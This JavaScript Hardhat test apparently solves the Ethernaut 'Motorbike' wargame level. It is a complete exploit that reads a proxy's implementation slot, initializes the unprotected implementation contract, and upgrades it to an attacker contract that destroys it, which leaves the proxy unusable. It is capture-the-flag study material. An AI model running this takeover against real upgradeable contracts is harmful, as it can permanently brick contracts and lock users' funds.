import { ethers } from "hardhat";
import { expect } from "chai";

describe("Attack", () => {
  it("Should work", async () => {
    const contract = { address: "0x18C3ecc88F5d3dE43266FaCc2B49DAcF6D6BAa52" };

    const _IMPLEMENTATION_SLOT = "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc";
    const implementation = {
      address: "0x" + (await ethers.provider.getStorageAt(contract.address,_IMPLEMENTATION_SLOT)).slice(26)
    };

    const engine = await ethers.getContractAt("Engine", contract.address);
    const engineImpl = await ethers.getContractAt("Engine", implementation.address);
    await engineImpl.initialize();

    const Attacker = await ethers.getContractFactory("MotorbikeAttacker");
    const attacker = await Attacker.deploy();

    const iface = new ethers.utils.Interface(["function attack()"]);
    const payload = iface.encodeFunctionData("attack");

    await engineImpl.upgradeToAndCall(attacker.address, payload);
    await expect(engine.upgrader()).to.be.reverted;
  })
})
